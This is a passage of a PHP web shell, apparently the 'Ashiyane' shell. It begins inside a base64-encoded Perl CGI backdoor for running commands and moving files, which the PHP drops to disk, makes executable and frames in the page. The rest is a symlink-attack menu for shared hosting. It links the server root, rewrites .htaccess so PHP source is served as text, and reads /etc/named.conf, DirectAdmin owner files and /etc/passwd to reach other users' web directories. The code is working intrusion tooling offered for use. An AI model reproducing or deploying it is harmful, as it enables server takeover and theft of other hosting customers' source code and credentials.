ZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQoJCXByaW50ICI8Y29kZT4kUHJvbXB0ICRSdW5Db21tYW5kPC9jb2RlPiI7DQoJfQ0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJCX0NCgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCQl7DQoJCQkkfD0xOw0KCQkJJENvbW1hbmQgLj0gIiB8IjsNCgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQkJew0KCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJCXByaW50ICIkX1xuIjsNCgkJCX0NCgkJCSR8PTA7DQoJCX0NCgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJCXsNCgkJCXByaW50IGAkQ29tbWFuZGA7DQoJCX0NCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJYWxhcm0oMCk7DQoJCX0NCgkJcHJpbnQgIjwveG1wPiI7DQoJfQ0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCE8L2NvZGU+IjsNCgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNURE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShTRU5ERklMRSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkITwvY29kZT4iOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQkmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJcmV0dXJuOw0KCX0NCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCXByaW50ICI8Y29kZT5VcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZA0KCWNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7DQoNCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCglpZigtZSAkVGFyZ2V0TmFtZSAmJiAkT3B0aW9ucyBuZSAib3ZlcndyaXRlIikNCgl7DQoJCXByaW50ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJcHJpbnQgIjwvY29kZT4iOw0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpICMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kDQp7DQoJJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCSZEb3dubG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAjIHVzZXIgd2FudHMgdG8gbG9nb3V0DQp7DQoJJlBlcmZvcm1Mb2dvdXQ7DQp9DQoNCg0K

"; $ashiyane6 = fopen('cgi.ashiyane','w+'); $ashiyane7 = fwrite ($ashiyane6 ,base64_decode($ashiyane5)); fclose($ashiyane6); chmod('cgi.ashiyane',0755); echo '<a name="down"></a><iframe src=cgiashiyane/cgi.ashiyane width=100% height=600px frameborder=0></iframe> '; } if($action=="sym"){ echo "<style>#sym{background: #000000}</style>"; ?>
        <div style="font-size:20px">
        <center>
        <a href="?action=sym&sym=dsym"><input type="button" value="Domains"></a>
        <a href="?action=sym&sym=dusym"><input type="button" value="Domains User Symlink"></a>
        <a href="?action=sym&sym=passwd"><input type="button" value="Passwd Symlink"></a>
        <a href="?action=sym&sym=fsym"><input type="button" value="File Symlinker"></a>
        <a href="?action=sym&sym=dasym"><input type="button" value="Direct Admin Symlink"></a>
        </center>
        <br /><br />
        </div>
        <?php  if(isset($_GET['sym']) && $_GET['sym']=="dusym"){ if(!@file_exists("/etc/virtual/domainowners")){ @set_time_limit(0); echo "<center>"; @mkdir('sym',0777); $ht = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $htfile =@fopen ('sym/.htaccess','w'); fwrite($htfile ,$ht); @symlink('/','sym/root'); $basename = basename('_FILE_'); $namedfile = @file('/etc/named.conf'); if(!$namedfile) { echo "<b><font color=\"#FFFFFF\">Cant access /etc/named.conf on server</b></font></center>"; } else { echo "<br>"; echo "<table align='center' width='40%' class='syms'>
<td><font color=\"#FFFFFF\"><b><center># Count</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>Domains</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>Users</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>symlink</center></font></b></td>"; $count=1; foreach($namedfile as $namedfiles){ if(@eregi('zone',$namedfiles)){ preg_match_all('#zone "(.*)"#',$namedfiles,$namedfiles2); flush(); if(strlen(trim($namedfiles2[1][0])) >2){ $valiasesfile = posix_getpwuid(@fileowner('/etc/valiases/'.$namedfiles2[1][0])); $valiasfilename = $valiasesfile['name']; @symlink('/','sym/root'); $valiasfilename = $namedfiles2[1][0]; $irdom = '\.ir'; $ildom = '\.il'; if (@eregi("$irdom",$namedfiles2[1][0]) or @eregi("$ildom",$namedfiles2[1][0]) ){ $valiasfilename = "<b><font style=\"color:#FFFFFF\">".$namedfiles2[1][0].'</font></b>'; } echo "<tr><td><font color=\"#FFFFFF\">{$count}</font></td><td><a target='_blank' href=http://www.".$namedfiles2[1][0].'/><font color=#FFFFFF><b>'.$valiasfilename.'</b> </a></font></td><td><font color="white"><b>'.$valiasesfile['name']."</font></b></td><td><a href='sym/root/home/".$valiasesfile['name']."/public_html' target='_blank'><font color=\"#FF0000\">symlink </font></a></td></tr>";flush(); $count++;}}}} } else { echo '<center><br><font color="#FFFFFF">This is Server DirectAdmin Use </font><font color="#FF0000"><a href="?action=sym&sym=dasym">Symlink for Direct Admin</a></font></b></center> '; } echo "</center></table>"; } if(isset($_GET['sym']) && $_GET['sym']=="dasym"){ if(@file_exists("/etc/virtual/domainowners")){ @mkdir('sym',0777); $ht = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $htfile =@fopen ('sym/.htaccess','w'); fwrite($htfile ,$ht); @symlink('/','sym/root'); fclose($htfile); $sole = @file("/etc/virtual/domainowners"); $count=1; echo "<br>"; echo "<table align='center' width='40%' class='syms'>
<td><font color=\"#FFFFFF\"><b><center># Count</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>Domains</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>Users</center></font></b></td>
<td><font color=\"#FFFFFF\"><b><center>symlink</center></font></b></td>"; foreach($sole as $visible){ if(@eregi(":",$visible)){ $exfile = explode(':', $visible); echo "<tr><td><font color=\"#FFFFFF\">{$count}</font></td><td><a target='_blank' href=http://www.".trim($exfile[0]).'/><font color=\"#FFFFFF\"><b>'.trim($exfile[0]).'</b> </font></a></td><td><font color="white"><b>'.trim($exfile[1])."</font></b></td><td><a href='sym/root/home/".trim($exfile[1])."/public_html' target='_blank'><font color=\"#FF0000\">symlink </font></a></td></tr>";flush(); $count++;}}echo "</table>";}else{echo '<center><br><font color="#FFFFFF">This is Server Cpanel Please Use </font><font color="#FF0000"><a href="?action=sym&sym=dusym">Symlink for Cpanel</a></font></b><br></center>';} } if(isset($_GET['sym']) && $_GET['sym']=="dsym"){ if(!@file_exists("/etc/virtual/domainowners")){ echo "<center>"; echo "<br>"; $d0mains = @file("/etc/named.conf"); if(!$d0mains){ echo "<b><font color=\"#FFFFFF\">Cant access /etc/named.conf on server</b></font></center>"; } echo "<br><table align='center' width='40%' class='syms'><td><font color=\"#FFFFFF\"><b><center>#Count</center></font></b></td><td><font color=\"#FFFFFF\"><b><center>Domains</center></font></b></td><td><font color=\"#FFFFFF\"><b><center>Users</center></font></b></td>"; $count=1; if (is_array($d0mains) || is_object($d0mains)) { foreach($d0mains as $d0main){ if(@eregi("zone",$d0main)){ preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if(strlen(trim($domains[1][0])) > 2){ $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0])); echo "<tr><td><b><font color=\"#FFFFFF\">".$count."</b></font></td><td><a href=http://www.".$domains[1][0]."/><font color=\"#FFFFFF\"><b>".$domains[1][0]."</font></b></a></td><td><b><font color=\"#FFFFFF\">".$user['name']."</font></b></td></tr>";flush(); $count++; }}} } echo "</center></table>"; }else{echo '<center><br><font color="#FFFFFF">This  Server is DirectAdmin Please Use </font><font color="#FF0000"><a href="?action=sym&sym=dasym">Symlink for Direct Admin</a></font> </center>';} } if(isset($_GET['sym']) && $_GET['sym']=="passwd"){ @mkdir('sym',0777); $htcs = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $f =@fopen ('sym/.htaccess','w'); fwrite($f , $htcs); @symlink("/","sym/root"); $pg = basename(__FILE__); if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){ $cont = stripcslashes($_POST['file']); if(!file_exists('passwd.txt')){ $f = @fopen('passwd.txt','w'); $w = @fwrite($f,$cont); fclose($f); } if($w or @filesize('passwd.txt') > 0){ echo "<div class='tmp'><table align='center' width='35%'><td>Users</td><td>symlink</td><td>FTP</td>"; flush(); $fil3 = file('passwd.txt'); foreach ($fil3 as $f){ $u=explode(':', $f); $user = $u['0']; echo "
<tr>



<td width='15%'>
$user
</td>
<td width='10%'>
<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
</td>

<td width='10%'>
<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
</td>



</tr></div> "; flush(); flush(); } die ("</tr></div>"); } } echo "<center>Read /etc/passwd"; echo "<br /><br /><form method='post' action='?action=sym&sym=passwd&save=1'><textarea cols='80' rows='20' name='file'>"; flush(); $file = '/etc/passwd'; $r3ad = @fopen($file, 'r'); if ($r3ad){ $content = @fread($r3ad, @filesize($file)); echo "".htmlentities($content).""; } elseif(!$r3ad) { $r3ad = @show_source($file) ; } elseif(!$r3ad) { $r3ad = @highlight_file($file); } elseif(!$r3ad) { for($uid=0;$uid<1000;$uid++){ $ara = posix_getpwuid($uid); if (!empty($ara)) { while (list ($key, $val) = each($ara)){ print "$val:"; } print "\n"; } } } flush(); echo "</textarea><br /><br /><input  type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form></center>"; flush(); } if(isset($_GET['sym']) && $_GET['sym']=="fsym"){ echo'<center>The file path to symlink :

<br /><br />

<form method="post" action="?action=sym&sym=fsym">
<input type="text" name="file" value="/home/user/public_html/[File Name]" size="60"/><br /><br />
<input type="text" name="symfile" value="sym.txt" size="60"/><br /><br />
<input type="submit" value="symlink" name="symlink" /> <br /><br />
</form>
</center>
'; if(isset($_POST['file']) && isset($_POST['symfile']) & isset($_POST['symlink'])){ $path_file = $_POST['file']; $symfile = $_POST['symfile']; $symlink = $_POST['symlink']; if ($symlink) { @mkdir('symlink',0777); $c = "Options Indexes FollowSymLinks \n DirectoryIndex ssssss.htm \n AddType txt .php \n AddHandler txt .php \n  AddType txt .html \n AddHandler txt .html \n Options all \n Options \n Allow from all \n"; $f =@fopen ('symlink/.htaccess','w'); @fwrite($f , $c); @symlink("$path_file","symlink/$symfile"); echo '<br /><a target="_blank" href="symlink/'.$symfile.'" >'.$symfile.'</a>'; } } } } if($action=="zipper"){ if (class_exists('ZipArchive')){ echo '
<center>
<br /><br />
<form actoin="?action=zipper&dir='.$path.'#down" method="post">
<a name="down"></a>
<font color="#FFFFFF"><b>Dir:</b> </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['path']).'" size="60"/><br /><br />
<font color="#FFFFFF"><b>Save Dir: </b></font><input type="text" name="zipfile" value="NmR.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
